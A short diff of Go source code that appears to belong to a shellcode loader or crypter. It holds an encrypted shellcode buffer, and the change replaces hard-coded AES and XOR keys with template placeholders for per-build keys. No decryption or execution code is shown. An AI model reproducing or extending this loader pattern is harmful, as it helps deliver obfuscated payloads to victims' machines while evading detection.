@@ -22,8 +22,8 @@ import (
 var encryptedShellcode []byte
 
 const (
-	aesKeyHex = "d5997b039b6c00d9a4b8d2616a2eba23e301fe82b63d48ddd99d30d842ba1f95"
-	xorKeyHex = "033d8fe329f74d5bbf02d63bab80f733"
+	aesKeyHex = "%KEYAES%"
+	xorKeyHex = "%KEYXOR%"
 )
 
 func verifyDataIntegrity(data []byte, stage string) bool {
